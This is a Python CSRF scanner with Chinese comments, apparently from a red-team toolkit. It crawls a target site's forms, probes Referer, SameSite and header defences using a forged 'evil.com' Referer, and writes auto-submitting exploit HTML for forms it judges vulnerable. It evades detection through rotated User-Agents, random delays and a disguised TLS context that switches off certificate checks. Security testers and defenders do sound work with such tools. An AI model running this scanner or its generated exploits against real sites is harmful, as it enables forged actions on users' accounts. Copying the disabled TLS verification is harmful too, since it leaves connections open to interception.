#!/usr/bin/env python3
"""
CSRF 检测工具
爬取页面所有表单，检查 CSRF Token、Referer 验证、SameSite Cookie 属性、
自定义 Header 验证，并生成可利用的 CSRF POC HTML。
"""

import argparse
import json
import os
import random
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ============================================================
# 反反爬策略：随机 User-Agent 池（20+）
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

DELAY_MIN = 1.0
DELAY_MAX = 3.0


def random_delay():
    """随机延迟 1-3 秒"""
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))


def create_ssl_context():
    """创建 TLS 指纹伪装 SSL 上下文"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS")
        except Exception:
            pass
        return ctx
    except Exception:
        return None


def build_headers(url, cookie=None, extra=None):
    """构建反反爬请求头"""
    parsed = urllib.parse.urlparse(url)
    referer = parsed.scheme + "://" + parsed.netloc + "/" if parsed.netloc else url
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Referer": referer,
        "Connection": "keep-alive",
    }
    if cookie:
        headers["Cookie"] = cookie
    if extra:
        headers.update(extra)
    return headers


def make_request(url, method="GET", data=None, cookie=None, proxy=None, timeout=10, extra_headers=None):
    """发起带反反爬策略的 HTTP 请求"""
    ctx = create_ssl_context()
    headers = build_headers(url, cookie, extra_headers)
    post_data = None
    if data and method.upper() == "POST":
        if isinstance(data, dict):
            post_data = urllib.parse.urlencode(data).encode("utf-8")
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        elif isinstance(data, str):
            post_data = data.encode("utf-8")
    req = urllib.request.Request(url, data=post_data, headers=headers, method=method.upper())
    if proxy:
        proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
        handlers = [proxy_handler]
    else:
        handlers = []
    if ctx:
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    opener = urllib.request.build_opener(*handlers) if handlers else urllib.request.build_opener()
    try:
        resp = opener.open(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        status = resp.getcode()
        resp_headers = dict(resp.headers)
        return status, body, resp_headers
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return e.code, body, dict(e.headers) if e.headers else {}
    except Exception:
        return None, None, None


# ============================================================
# CSRF Token 关键字
# ============================================================

CSRF_TOKEN_NAMES = [
    "csrf_token", "csrftoken", "csrf", "_token", "authenticity_token",
    "__RequestVerificationToken", "csrfmiddlewaretoken", "_csrf_token",
    "anti_forgery_token", "anticsrf", "__CSRFToken", "OWASP_CSRFTOKEN",
    "csrfkey", "CSRFToken", "token", "_csrf",
]

CSRF_HEADER_NAMES = [
    "x-csrf-token", "x-xsrf-token", "x-csrfheader", "x-xcsrf",
    "x-requested-with", "x-csrftoken",
]


def extract_forms(html, base_url):
    """从 HTML 中提取所有表单"""
    forms = []
    # 匹配 form 标签
    form_pattern = re.compile(
        r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*method=["\']?([^"\'>\s]*)["\']?[^>]*>(.*?)</form>',
        re.IGNORECASE | re.DOTALL,
    )
    for match in form_pattern.finditer(html):
        action = match.group(1).strip() if match.group(1) else ""
        method = match.group(2).strip().upper() if match.group(2) else "GET"
        form_html = match.group(3)

        # 解析 action URL
        if action:
            if not action.startswith("http"):
                action = urllib.parse.urljoin(base_url, action)
        else:
            action = base_url

        # 提取 input 字段
        inputs = []
        input_pattern = re.compile(
            r'<input[^>]*name=["\']?([^"\'>\s]*)["\']?[^>]*value=["\']?([^"\'>]*)["\']?[^>]*>',
            re.IGNORECASE,
        )
        for inp in input_pattern.finditer(form_html):
            inputs.append({
                "name": inp.group(1),
                "value": inp.group(2),
            })
        # 提取 select 字段
        select_pattern = re.compile(
            r'<select[^>]*name=["\']?([^"\'>\s]*)["\']?[^>]*>.*?</select>',
            re.IGNORECASE | re.DOTALL,
        )
        for sel in select_pattern.finditer(form_html):
            inputs.append({"name": sel.group(1), "value": ""})
        # 提取 textarea 字段
        textarea_pattern = re.compile(
            r'<textarea[^>]*name=["\']?([^"\'>\s]*)["\']?[^>]*>.*?</textarea>',
            re.IGNORECASE | re.DOTALL,
        )
        for ta in textarea_pattern.finditer(form_html):
            inputs.append({"name": ta.group(1), "value": ""})

        has_csrf_token = any(
            any(token_name.lower() in inp["name"].lower() for token_name in CSRF_TOKEN_NAMES)
            for inp in inputs
        )

        forms.append({
            "action": action,
            "method": method,
            "inputs": inputs,
            "has_csrf_token": has_csrf_token,
            "raw_html": "<form action='{}' method='{}'>{}</form>".format(action, method, form_html[:200]),
        })
    return forms


def check_referer_validation(url, cookie=None, proxy=None, timeout=10):
    """检查 Referer 验证"""
    random_delay()
    # 不带 Referer 发送 POST 请求
    status1, body1, _ = make_request(url, "GET", None, cookie, proxy, timeout, {"Referer": ""})
    random_delay()
    # 带外站 Referer
    status2, body2, _ = make_request(url, "GET", None, cookie, proxy, timeout, {"Referer": "http://evil.com/"})

    if status1 and status2:
        # 如果不带 Referer 或外站 Referer 被拒绝，说明有 Referer 验证
        if status1 in (403, 401) or status2 in (403, 401):
            return {"has_referer_validation": True, "status_no_referer": status1, "status_foreign_referer": status2}
        # 如果响应内容差异很大，也可能有验证
        if body1 and body2 and abs(len(body1) - len(body2)) > 500:
            return {"has_referer_validation": True, "reason": "响应差异显著", "status_no_referer": status1, "status_foreign_referer": status2}
    return {"has_referer_validation": False, "status_no_referer": status1, "status_foreign_referer": status2}


def check_samesite_cookie(url, cookie=None, proxy=None, timeout=10):
    """检查 SameSite Cookie 属性"""
    random_delay()
    _, _, headers = make_request(url, "GET", None, cookie, proxy, timeout)
    set_cookie = headers.get("Set-Cookie", "") if headers else ""
    if not set_cookie:
        set_cookie = headers.get("set-cookie", "") if headers else ""

    if set_cookie:
        has_samesite = "samesite" in set_cookie.lower()
        samesite_value = ""
        if has_samesite:
            m = re.search(r"samesite\s*=\s*(\w+)", set_cookie, re.IGNORECASE)
            if m:
                samesite_value = m.group(1)
        return {
            "has_set_cookie": True,
            "has_samesite": has_samesite,
            "samesite_value": samesite_value,
            "raw_set_cookie": set_cookie[:200],
        }
    return {"has_set_cookie": False, "has_samesite": False}


def check_custom_header(url, cookie=None, proxy=None, timeout=10):
    """检查自定义 Header 验证"""
    # 检查页面 JS 中是否使用自定义 header
    random_delay()
    _, body, _ = make_request(url, "GET", None, cookie, proxy, timeout)
    if not body:
        return {"has_custom_header": False}

    header_found = []
    for header_name in CSRF_HEADER_NAMES:
        if header_name.lower() in body.lower():
            header_found.append(header_name)
    return {"has_custom_header": len(header_found) > 0, "headers_found": header_found}


def generate_csrf_poc(form):
    """生成 CSRF POC HTML"""
    action = form["action"]
    method = form["method"]
    inputs_html = ""
    for inp in form["inputs"]:
        name = inp["name"]
        value = inp["value"] if inp["value"] else "test_value"
        # 跳过 CSRF token 字段
        is_csrf = any(tn.lower() in name.lower() for tn in CSRF_TOKEN_NAMES)
        if not is_csrf:
            inputs_html += '    <input type="hidden" name="{}" value="{}" />\n'.format(name, value)

    poc_html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF POC</title>
</head>
<body>
    <h2>CSRF Exploit POC</h2>
    <p>Target: {}</p>
    <form id="csrf_form" action="{}" method="{}">
{}
    </form>
    <script>
        // 自动提交表单
        document.getElementById('csrf_form').submit();
    </script>
</body>
</html>""".format(action, action, method, inputs_html)

    return poc_html


def scan_csrf(url, cookie=None, depth=1, proxy=None, timeout=10):
    """CSRF 漏洞扫描"""
    random_delay()
    status, body, _ = make_request(url, "GET", None, cookie, proxy, timeout)
    if not body:
        return {"url": url, "error": "无法获取页面内容"}

    # 提取表单
    forms = extract_forms(body, url)

    # 检查各种 CSRF 防护
    referer_check = check_referer_validation(url, cookie, proxy, timeout)
    samesite_check = check_samesite_cookie(url, cookie, proxy, timeout)
    header_check = check_custom_header(url, cookie, proxy, timeout)

    # 分析每个表单的 CSRF 风险
    form_results = []
    for form in forms:
        risk_factors = []
        if not form["has_csrf_token"]:
            risk_factors.append("表单缺少 CSRF Token")
        if not referer_check.get("has_referer_validation", False):
            risk_factors.append("未检测到 Referer 验证")
        if not samesite_check.get("has_samesite", False):
            risk_factors.append("Cookie 缺少 SameSite 属性")
        if not header_check.get("has_custom_header", False):
            risk_factors.append("未检测到自定义 Header 验证")

        is_vulnerable = len(risk_factors) >= 2 and form["method"] == "POST"
        poc = generate_csrf_poc(form) if is_vulnerable else None

        form_results.append({
            "action": form["action"],
            "method": form["method"],
            "input_count": len(form["inputs"]),
            "has_csrf_token": form["has_csrf_token"],
            "is_vulnerable": is_vulnerable,
            "risk_factors": risk_factors,
            "poc": poc,
        })

    # 如果深度大于1，递归爬取链接
    linked_pages = []
    if depth > 1:
        link_pattern = re.compile(r'href=["\']?([^"\'>\s]+)["\']?', re.IGNORECASE)
        for m in link_pattern.finditer(body):
            link = m.group(1)
            if link and not link.startswith(("#", "javascript:", "mailto:", "tel:")):
                if not link.startswith("http"):
                    link = urllib.parse.urljoin(url, link)
                if link not in linked_pages and link != url:
                    linked_pages.append(link)

    vulnerable_count = sum(1 for f in form_results if f["is_vulnerable"])

    return {
        "url": url,
        "total_forms": len(form_results),
        "vulnerable_forms": vulnerable_count,
        "is_vulnerable": vulnerable_count > 0,
        "referer_validation": referer_check,
        "samesite_cookie": samesite_check,
        "custom_header": header_check,
        "forms": form_results,
        "scanned_depth": depth,
        "linked_pages": linked_pages[:10],
    }


def main():
    parser = argparse.ArgumentParser(
        description="CSRF 检测工具 - 检测表单 CSRF 防护缺失并生成 POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例:\n  %(prog)s --url https://example.com\n  %(prog)s --url https://example.com --depth 2 --output result.json",
    )
    parser.add_argument("--url", required=True, help="目标 URL")
    parser.add_argument("--cookie", help="Cookie 字符串（可选）")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    parser.add_argument("--depth", type=int, default=1, help="爬取深度（默认 1）")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数（默认 10）")
    parser.add_argument("--proxy", help="代理地址（可选）")
    args = parser.parse_args()

    # 认证模块导入
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "exploit"))
        from red_team_auth import require_auth
        require_auth()
    except ImportError:
        pass

    try:
        result = scan_csrf(args.url, args.cookie, args.depth, args.proxy, args.timeout)
        json_output = json.dumps(result, ensure_ascii=False, indent=2)
        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print("结果已保存到: {}".format(args.output))
            except IOError as e:
                print(json.dumps({"error": "写入文件失败: {}".format(e)}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)
    except KeyboardInterrupt:
        print(json.dumps({"error": "用户中断"}), file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(json.dumps({"error": "扫描失败: {}".format(e)}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
